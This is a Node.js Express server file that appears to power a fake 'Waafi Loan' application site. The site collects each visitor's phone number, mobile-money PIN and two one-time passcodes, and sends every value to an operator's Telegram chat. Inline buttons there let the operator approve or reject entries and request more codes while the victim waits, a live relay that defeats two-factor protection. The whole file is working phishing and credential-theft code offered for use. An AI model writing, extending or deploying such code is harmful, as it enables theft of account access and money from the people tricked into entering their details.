require('dotenv').config(); // Load environment variables from .env file
const express = require('express');
const path = require('path');
const app = express();

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

// Environment Variables Configuration
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
let ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID || null; 

// Session State Management
let currentState = {
    amount: '1,000',
    duration: '12 months',
    monthly: '$98.33',
    phone: '',
    pin: '',
    pinStatus: 'pending', // 'pending', 'approved', 'rejected'
    otp1: '',
    otp1Status: 'pending', // 'pending', 'success', 'wrong'
    otp2: '',
    otp2Status: 'pending'  // 'pending', 'success', 'wrong'
};

// Helper function to send Telegram messages with inline buttons
async function sendTelegramMessage(text, replyMarkup = null) {
    if (!ADMIN_CHAT_ID) {
        console.warn('Warning: ADMIN_CHAT_ID is not set!');
        return;
    }
    try {
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: ADMIN_CHAT_ID,
                text: text,
                reply_markup: replyMarkup
            })
        });
    } catch (e) {
        console.error('Telegram send error:', e);
    }
}

// Routes for Pages
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.get('/page2', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'page2.html'));
});

// API: Save Loan Request Details
app.post('/api/loan-request', (req, res) => {
    const { amount, duration, monthly } = req.body;
    currentState.amount = amount;
    currentState.duration = duration;
    currentState.monthly = monthly;
    res.json({ success: true });
});

// API: Submit Phone and PIN
app.post('/api/submit-pin-data', async (req, res) => {
    const { phone, pin } = req.body;
    currentState.phone = phone;
    currentState.pin = pin;
    currentState.pinStatus = 'pending';

    const msg = `📥 **New Waafi Loan Request**\n\n📞 Phone: ${phone}\n💰 Amount: $${currentState.amount}\n⏱ Duration: ${currentState.duration}\n🔐 PIN: ${pin}`;
    
    const inlineKeyboard = {
        inline_keyboard: [
            [
                { text: '✅ Approve', callback_data: 'approve_pin' },
                { text: '❌ Reject', callback_data: 'reject_pin' }
            ],
            [
                { text: '🔢 Request OTP 1', callback_data: 'request_otp1' },
                { text: '🔢 Request OTP 2', callback_data: 'request_otp2' }
            ]
        ]
    };

    await sendTelegramMessage(msg, inlineKeyboard);
    res.json({ success: true });
});

// API: Check PIN Status
app.get('/api/check-pin-status', (req, res) => {
    res.json({ status: currentState.pinStatus });
});

// API: Verify OTP 1
app.post('/api/verify-otp1', async (req, res) => {
    const { otp1 } = req.body;
    currentState.otp1 = otp1;
    currentState.otp1Status = 'pending';

    await sendTelegramMessage(`🔢 **OTP 1 Entered:** ${otp1}\n📞 Phone: ${currentState.phone}`, {
        inline_keyboard: [
            [
                { text: '✅ Confirm OTP 1', callback_data: 'otp1_success' },
                { text: '❌ Wrong OTP', callback_data: 'otp1_wrong' }
            ]
        ]
    });
    res.json({ success: true });
});

app.get('/api/check-otp1-status', (req, res) => {
    res.json({ status: currentState.otp1Status });
});

// API: Verify OTP 2
app.post('/api/verify-otp2', async (req, res) => {
    const { otp2 } = req.body;
    currentState.otp2 = otp2;
    currentState.otp2Status = 'pending';

    await sendTelegramMessage(`🔢 **OTP 2 Entered:** ${otp2}\n📞 Phone: ${currentState.phone}`, {
        inline_keyboard: [
            [
                { text: '✅ Complete Request', callback_data: 'otp2_success' },
                { text: '❌ Wrong OTP', callback_data: 'otp2_wrong' }
            ]
        ]
    });
    res.json({ success: true });
});

app.get('/api/check-otp2-status', (req, res) => {
    res.json({ status: currentState.otp2Status });
});

// Telegram Webhook Handler for Admin Actions
app.post('/telegram-webhook', async (req, res) => {
    const update = req.body;

    if (update.message) {
        ADMIN_CHAT_ID = update.message.chat.id;
        await sendTelegramMessage(`🤖 Bot successfully connected! Your Chat ID is: ${ADMIN_CHAT_ID}`);
    }

    if (update.callback_query) {
        const query = update.callback_query;
        ADMIN_CHAT_ID = query.message.chat.id;
        const data = query.data;

        if (data === 'approve_pin') {
            currentState.pinStatus = 'approved';
            await sendTelegramMessage(`✅ PIN approved for number ${currentState.phone}`);
        } else if (data === 'reject_pin') {
            currentState.pinStatus = 'rejected';
            await sendTelegramMessage(`❌ PIN rejected.`);
        } else if (data === 'request_otp1') {
            currentState.pinStatus = 'approved'; 
            await sendTelegramMessage(`📲 Requested OTP 1 from the user.`);
        } else if (data === 'otp1_success') {
            currentState.otp1Status = 'success';
            await sendTelegramMessage(`✅ OTP 1 verified successfully.`);
        } else if (data === 'otp1_wrong') {
            currentState.otp1Status = 'wrong';
            await sendTelegramMessage(`❌ OTP 1 is incorrect.`);
        } else if (data === 'otp2_success') {
            currentState.otp2Status = 'success';
            await sendTelegramMessage(`🎉 Loan fully approved and processed for ${currentState.phone}!`);
        } else if (data === 'otp2_wrong') {
            currentState.otp2Status = 'wrong';
            await sendTelegramMessage(`❌ OTP 2 is incorrect.`);
        }

        const answerUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`;
        await fetch(answerUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ callback_query_id: query.id, text: 'Updated!' })
        });
    }

    res.sendStatus(200);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});